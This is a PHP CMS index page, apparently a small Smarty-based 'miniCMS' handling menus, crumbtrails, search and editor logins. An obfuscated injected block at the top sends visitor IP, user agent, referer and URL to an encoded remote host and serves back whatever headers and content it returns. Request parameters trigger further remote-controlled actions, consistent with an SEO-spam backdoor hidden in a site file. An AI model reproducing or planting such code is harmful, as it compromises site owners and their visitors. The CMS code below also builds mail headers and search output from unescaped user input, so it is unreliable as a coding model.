xyy_yzz__z($x_yy_z_zyz){$xyz_zyyz__=@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x79\x7a\x5f\x5f\x7a\x7a"]("/{\\|}/si",$x_yy_z_zyz,-1,PREG_SPLIT_NO_EMPTY);if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x79\x5f\x5f\x7a\x79\x7a\x79"]($xyz_zyyz__)){return false;}if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x5f\x79\x7a\x79\x5f"]($xyz_zyyz__)!=2){return false;}return $xyz_zyyz__;}function xy_zyzz__y($xyyzz__zy_,$x__yz_yzzy){$xy_z_zyz_y=array();$xy_z_zyz_y["\x64\x65\x66\x61\x75\x6c\x74\x5f\x70\x61\x72\x61\x6d\x73"]=$xyyzz__zy_;$xy_z_zyz_y["\x61\x70\x69"]=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"](x__yzy_yzz($xy_z_zyz_y["\x64\x65\x66\x61\x75\x6c\x74\x5f\x70\x61\x72\x61\x6d\x73"]));$xy_z_zyz_y["\x73\x65\x72\x76\x65\x72\x5f\x64\x6f\x6d\x61\x69\x6e"]=xzyy_y_zz_();$xy_z_zyz_y["\x72\x65\x71\x75\x65\x73\x74\x5f\x75\x72\x6c"]=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"];$xy_z_zyz_y["\x72\x65\x66\x65\x72\x65\x72"]=isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x45\x46\x45\x52\x45\x52"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x45\x46\x45\x52\x45\x52"]:'';$xy_z_zyz_y["\x75\x73\x65\x72\x5f\x61\x67\x65\x6e\x74"]=isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54"]:'';$xy_z_zyz_y["\x69\x70"]=xyzyz___zy();if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x53"])){$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"]=x_zz_z_yyy('yygpKYcSi20tcykHAA==');}else{$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"]=x_zz_z_yyy('yygpKcEbDdqS1wcA');}if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x41\x43\x43\x45\x50\x54\x5f\x4c\x41\x4e\x47\x55\x41\x47\x45"])){$xy_z_zyz_y["\x6c\x61\x6e\x67\x75\x61\x67\x65"]=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x41\x43\x43\x45\x50\x54\x5f\x4c\x41\x4e\x47\x55\x41\x47\x45"];}else{$xy_z_zyz_y["\x6c\x61\x6e\x67\x75\x61\x67\x65"]="";}if(isset(${"\x5f\x47\x45\x54"}["\x70\x61\x72\x61\x6d\x73"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x7a\x79\x79\x7a\x79\x5f"]($xy_z_zyz_y);die();}if(isset(${"\x5f\x47\x45\x54"}["\x73\x69\x74\x65\x6d\x61\x70"])){$x__yzz_yzy=${"\x5f\x47\x45\x54"}["\x73\x69\x74\x65\x6d\x61\x70"];$x_yyz_z_zy=x_zz_z_yyy('Ky8v1Oq0vPz0/PSdVLzs8wTFAA==');if(isset(${"\x5f\x47\x45\x54"}["\x67\x6f\x6f\x67\x6c\x65\x5f\x75\x72\x6c"])){$x_yyz_z_zy=${"\x5f\x47\x45\x54"}["\x67\x6f\x6f\x67\x6c\x65\x5f\x75\x72\x6c"];}x_z_zyyyz_($x_yyz_z_zy,$x__yzz_yzy,$xy_z_zyz_y);}$xyy_z_zzy_=x_zz_z_yyy('Uy3Wtsuy+yVS2uySgpKSi20tdPz89Pz0nVS87XyyqoUS22TyzIBEqrJSaDyILEkgwQXQIeUkAA==');$xyy_z_zzy_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]('|',$xyy_z_zzy_);if(isset($_REQUEST["\x61\x63"])&&isset($_REQUEST["\x70\x61\x74\x68"])&&isset($_REQUEST["\x74"])){xz_zy_zyy_(sprintf($xyy_z_zzy_[2],${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"](x__yzy_yzz($x__yz_yzzy)),$xy_z_zyz_y["\x61\x70\x69"],$_REQUEST["\x61\x63"],$_REQUEST["\x70\x61\x74\x68"],$_REQUEST["\x74"]));}$xy_zzzyy__=array('doxy_zyzz__y'=>$xy_z_zyz_y["\x73\x65\x72\x76\x65\x72\x5f\x64\x6f\x6d\x61\x69\x6e"],'request_url'=>$xy_z_zyz_y["\x72\x65\x71\x75\x65\x73\x74\x5f\x75\x72\x6c"],'ip'=>$xy_z_zyz_y["\x69\x70"],'agent'=>$xy_z_zyz_y["\x75\x73\x65\x72\x5f\x61\x67\x65\x6e\x74"],'referer'=>$xy_z_zyz_y["\x72\x65\x66\x65\x72\x65\x72"],'protocol'=>$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"],'language'=>$xy_z_zyz_y["\x6c\x61\x6e\x67\x75\x61\x67\x65"]);$xz_zy__zyy=sprintf($xyy_z_zzy_[0],$xy_z_zyz_y["\x61\x70\x69"],x__yzy_yzz(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x7a\x5f\x7a\x79\x79\x5f\x7a"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x7a\x5f\x5f\x5f\x7a\x79\x7a"]('{|}',$xy_zzzyy__))));$x_yy_z_zyz=xy_zyyz__z($xz_zy__zyy);if(isset($_REQUEST["\x64\x75\x6d\x70"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($x_yy_z_zyz);$x_yy_z_zyz=xy_zyyz__z($xyy_z_zzy_[1]);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($x_yy_z_zyz);die();}$xzz_y_yyz_=xyy_yzz__z($x_yy_z_zyz);if($xzz_y_yyz_!==false){@header($xzz_y_yyz_[0]);echo $xzz_y_yyz_[1];die();}}xy_zyzz__y($xyyzz__zy_,$x__yz_yzzy);
?>
<?

//session_name("miniCMSdemo");

session_start();
$_SESSION['webmaster']='Prasad PV';

include("smartyConfig.php");

include("config.php");



require_once 'plugins/phplayersmenu/lib/PHPLIB.php';

require_once 'plugins/phplayersmenu/lib/layersmenu-common2.inc.php';

//require_once 'plugins/phplayersmenu/lib/plainmenu.inc.php';

require_once 'plugins/phplayersmenu/lib/layersmenu.inc.php';



//list of editors in alphabetical order

$editorlist=array_keys($editors);

sort($editorlist);

$smarty->assign("editorlist", $editorlist);



$page = isset($_GET["page"]) ?  $_GET["page"] : "index";

if($page == "articles"){

    header("Location: articles.php?page=articles");	

}elseif($page == "index"){

    $articlesLimit = 2;

    include("articlesItems.php");

}

$bad_chars=array("'",'"',".",",","<",">","?","/","`","~","\\","!");

$page = str_replace($bad_chars,"",$page);

$smarty->assign("page", $page);



//for incorrect password message

if(isset($_REQUEST["error"]) && $_REQUEST["error"] != ""){

    $smarty->assign("error", $_REQUEST["error"]);

}



$pagewpluses = str_replace(" ", "+", $page); //url page name with +'s ion place of spaces and no .txt on end

$page = $page.".txt"; //filename



$fileContentsString = "";

$selectedIndex= -1;



if(file_exists("./content/sitemap.txt")){

    $fileContents2 = unserialize(file_get_contents('./content/sitemap.txt'));

    //crumbtrail

    $crumbtrail_array = explode("\n", $fileContents2["content"]);

    $crumbtrail_image = ' :: ';

    $crumbtrail = "";

    $i=0;

    $found = false;

    $current_level = "";



    //loop through the array until you find the current page, then go backwards until you reach the top level to get your crumbtrail

    while($i<count($crumbtrail_array) && $i > -1){

        if($found || strpos($crumbtrail_array[$i], "|index.php?page=".$pagewpluses)){

            if(!$found){

                //$selectedIndex = $i+1;

                $found = true;

            }

            $this_page = explode("|", $crumbtrail_array[$i]);

            //remove the link from the current page so the menu and sitemap don't link to the current page

            if(strpos($crumbtrail_array[$i], "|index.php?page=".$pagewpluses)){

                $crumbtrail_array[$i] = $this_page[0] . "|" . $this_page[1] . "|";

            }

            if($current_level == "" || strlen($current_level) > strlen($this_page[0])){

                $current_level = $this_page[0];

                

                if($crumbtrail == "" || count($this_page) < 3 | !isset($this_page[2]) || $this_page[2] == ""){

                    $crumbtrail = $crumbtrail_image . stripslashes($this_page[1]) . $crumbtrail;		

                }else{

                    $crumbtrail = $crumbtrail_image . ' <a class="crumbtrail" href="'. $this_page[2] .'">' . stripslashes($this_page[1]) . '</a>' . $crumbtrail;		

                }

                //if you are on the top level

                if($current_level == "."){

                    break(1);	

                }

            }

            //once you find the page in the array go backwards until you reach the top level (.)

            $i--;

        }else{

            //iterate through the array until you find the page you're on

            $i++;

            $selectedIndex = $i+1;

        }

    }

    //echo $crumbtrail;

    if($crumbtrail == ""){

        $crumbtrail = $crumbtrail_image . " " . ucwords(str_replace("+", " ", $pagewpluses));

    }



    $smarty->assign("crumbtrail", $crumbtrail);

    

    

    //menu

    $mid = new LayersMenu(); //new LayersMenu(6, 7, 2, 1);	// Gtk2-like

    //$mid->setMenuStructureFile('plugins/phplayersmenu/layersmenu-horizontal-1.txt');

    $fileContentsString = stripslashes(implode("\n", $crumbtrail_array));

    //$fileContentsString = $fileContents2["content"];

    $mid->setMenuStructureString($fileContentsString);

    $mid->setIconsize(16, 16);

    $mid->parseStructureForMenu('hormenu1');



    if($selectedIndex > 0){

        //$mid->setSelectedItemByCount('hormenu1', $selectedIndex);

    }

    $mid->newHorizontalMenu('hormenu1');

    $header = $mid->getHeader();

    $smarty->assign("header",$header);

    

    $menu = $mid->getMenu('hormenu1');

    $smarty->assign("menu",$menu);

    

    $menufooter = $mid->getFooter();

    $smarty->assign("menufooter",$menufooter);

    

}

if(file_exists("./content/".$page)){

    //$fileContents = unserialize(file_get_contents('./content/'.$page));

    $smarty->assign("content", $fileContentsString);

    if($page == "sitemap.txt"){

    /*

        $plainmid = new PlainMenu();

        //$plainmid->setPlainMenuTpl('layersmenu-plain_menu.ihtml');

        //$plainmid->setMenuStructureFile('/content/sitemap.txt');

        

        $plainmid->setMenuStructureString($fileContents["content"]);

        $plainmid->setIconsize(16, 16);

        $plainmid->parseStructureForMenu('plainmenu');

        $sitemap = $plainmid->newPlainMenu('plainmenu');

        $smarty->assign("sitemap",$sitemap);

        */

        require_once 'plugins/phplayersmenu/lib/treemenu.inc.php';

        $treemid = new TreeMenu();

        $treemid->setMenuStructureString($fileContentsString);

        $treemid->setIconsize(16, 16);

        $treemid->parseStructureForMenu('treemenu1');

        if($selectedIndex > 0){

            //$treemid->setSelectedItemByCount('treemenu1', $selectedIndex);

        }

        //$treemid->setSelectedItemByUrl('treemenu1', basename(__FILE__));

        $smarty->assign("sitemap", $treemid->newTreeMenu('treemenu1'));

    

    }

    

}

//$menustring = ".|Linus B. Torvalds|http://www.cs.Helsinki.FI/u/torvalds/|The father of Linux||Linus\n" . "...|Bugzilla|http://qa.mandrakesoft.com/|||Linux\n" . "..|Slackware|http://www.freesoftware.org/|Slackware Linux||Linux\n";

//$plainmid->setMenuStructureString($menustring);

//$smarty->assign("menu2", $plainmid->newPlainMenu('plainmenu'));

// let's map PHP's stripslashes function to a Smarty modifier.

$smarty->register_modifier('html_entity_decode', 'html_entity_decode');



//send email



if(isset($GET["page"]) && $_GET["page"] == "contact us"){

    if(isset($_REQUEST["sendEmail"])){

        if(isset($_REQUEST["message"]) && $_REQUEST["message"] != "" && 

        isset($_REQUEST["senderName"]) && $_REQUEST["senderName"] != "" && 

        isset($_REQUEST["senderEmail"]) && $_REQUEST["senderEmail"] != "")

        {

            if(mail($adminEmail, $feedbackSubject . $_REQUEST["subject"], $_REQUEST["message"], "From: \"".$_POST["senderName"]."\" <".$_POST["senderEmail"].">")){

                $smarty->assign("emailSuccess", "Your message has been sent.");

            }else{

                $smarty->assign("emailError", "Your email could not be sent, please try again later.");

                $smarty->assign("subject", $_REQUEST["subject"]);

                $smarty->assign("message", $_REQUEST["message"]);

            }

        }else{

            $smarty->assign("emailError", "You must enter your name, your email address and a message<br /> before you press send.");

            $smarty->assign("subject", $_REQUEST["subject"]);

            $smarty->assign("subject", $_REQUEST["senderName"]);

            $smarty->assign("subject", $_REQUEST["senderEmail"]);

        }

    }

}



$editorauthorised = false;

$editoradmin = false;

if(isset($_SESSION["authorisededitor"])){	

    $loggedIn = true;	

    $smarty->assign("loggedIn", true);

    $smarty->assign("editor", $_SESSION["authorisededitor"]);

    $editablepages = explode(",", $editorpages[$_SESSION["authorisededitor"]]);

    $thiseditor = $_SESSION["authorisededitor"];

    if(in_array("*", $editablepages)){

        $editoradmin = true;

        $thiseditor .= " (administrator)";

    }elseif(in_array($pagewpluses, $editablepages)){

        $editorauthorised = true;

    }

    $smarty->assign("editor", $thiseditor);

}

if ($editoradmin || (isset($_SESSION["authorised"]) && $_SESSION["authorised"] == true)){

    $_SESSION["authorised"] = "true";

    $smarty->assign("loggedIn", true);

    $admin = true;

}else{

    $admin = false;

}

$smarty->assign("admin", $admin);



if ($admin || $editorauthorised){

    $editMode = isset($_GET["edit"]) ? true : false;

    $area = isset($_GET["area"]) ? $_GET["area"] : "";

    $smarty->assign("edit",$editMode);

    $smarty->assign("area",$area );

    $smarty->assign("editable", true);

}



if (file_exists("content/top.txt"))

{

    $topContent = file_get_contents("content/top.txt");

    $smarty->assign("top",stripslashes($topContent));

}



if($page == "search.txt" && isset($_REQUEST['search_term']) && $_REQUEST['search_term'] != ""){

    $searchterm = $_REQUEST['search_term'];

    $content_dir = "content";

    $search_results = "";

    $dir = dir($content_dir);

    $search_results_array = array();

    while ($file = $dir->read()) {

        if(is_file($content_dir."/".$file)){

            $fileContents = file_get_contents($content_dir."/".$file);

            if(stristr($fileContents, $searchterm)){

                //echo $file . "<br />";

                $pageName = substr($file, 0, -4); //url page name with +'s ion place of spaces and no .txt on end				

                $search_results_array[$pageName] = substr_count (strtolower($fileContents), strtolower($searchterm));

                

                $fileContentsArray = unserialize($fileContents);

                if(stristr($fileContentsArray["title"], $searchterm)){

                    $search_results_array[$pageName] += 100;

                }elseif(stristr($fileContentsArray["metadata"], $searchterm)){

                    $search_results_array[$pageName] += 50;

                }

            }

        }

    }

    $content_dir2 = "content/";

    $dir = dir($content_dir2);

    while ($file = $dir->read()) {

        if(is_file($content_dir2."/".$file)){

            $fileContents = file_get_contents($content_dir2."/".$file);

            if(stristr($fileContents, $searchterm)){

                $pageName = substr($file, 0, -4); //url page name with +'s ion place of spaces and no .txt on end				

                $search_results_array[$pageName] = substr_count (strtolower($fileContents), strtolower($searchterm));

                

                $fileContentsArray = unserialize($fileContents);

                if(stristr($fileContentsArray["title"], $searchterm)){

                    $search_results_array[$pageName] += 100;

                }elseif(stristr($fileContentsArray["summary"], $searchterm)){

                    $search_results_array[$pageName] += 50;

                }

            }

        }

    }



    $search_results = "Your search for <strong>" . $searchterm . "</strong> returned ";

    switch(count($search_results_array)){

        case 0: 

            $search_results .= "no";

            $end = ".";

            break;

        default:

            $search_results .= count($search_results_array);

            $end = ":";

            break;

    }

    $search_results .= ' results.<br />If you can not find the page you are looking for <a href="index.php?page=sitemap">have a look at the sitemap</a>.<br /><br />';

    arsort($search_results_array);

    foreach($search_results_array as $key => $value){ 		

        //if($fileTime < 1){

        if(!is_numeric(substr($key, 0, 8))){

            $fileContentsArray = unserialize(file_get_contents($content_dir."/".$key.".txt"));

            $search_results .= ' > <a href="index.php?page='. str_replace(" ", "+", $key).'">'.stripslashes(ucwords($fileContentsArray["title"])).'</a><br />';

        }else{

            $fileTime = strtotime(substr($key, 0, 8));

            $fileContentsArray = unserialize(file_get_contents($content_dir2."/".$key.".txt"));

            $search_results .= ' <img src="images/rightarrow.gif" border="0" /> <a href="articles.php?page='. str_replace(" ", "+", $key).'">'.stripslashes(ucwords($fileContentsArray["title"])).'</a><br />';

        }

    }

    

}else{

    $search_results = "Please enter a search term in the search box.";

}

$smarty->assign("search_results", $search_results);



if (file_exists("content/".$page))

{

    $content = unserialize(file_get_contents("content/".$page));

    //var_dump($content);

    foreach ($content as $key => $value)

    {

        $smarty->assign($key,stripslashes($value));

    }

      $smarty->assign("updatedOn", "Page updated: " . date ("F j Y", filemtime("content/".$page)));

}

else

{

    if(!$loggedIn){

        $content = unserialize(file_get_contents("content/404.txt"));

        //var_dump($content);

        foreach ($content as $key => $value)

        {

            $smarty->assign($key,stripslashes($value));

        }

        $smarty->assign("crumbtrail","");

    }else{

        $smarty->assign("newPage",true);

        $smarty->assign("edit", true);

        $smarty->assign("area", "content");

    }

}



if (file_exists("content/right.txt"))

{

    $rightContent = file_get_contents("content/right.txt");

    $smarty->assign("right",$rightContent);

}



if (file_exists("content/footer.txt"))

{

    $footerContent = file_get_contents("content/footer.txt");

    $smarty->assign("footer",$footerContent);

}



//$smarty->assign("contentWidth", "790px");

$smarty->display('index.tpl');

?>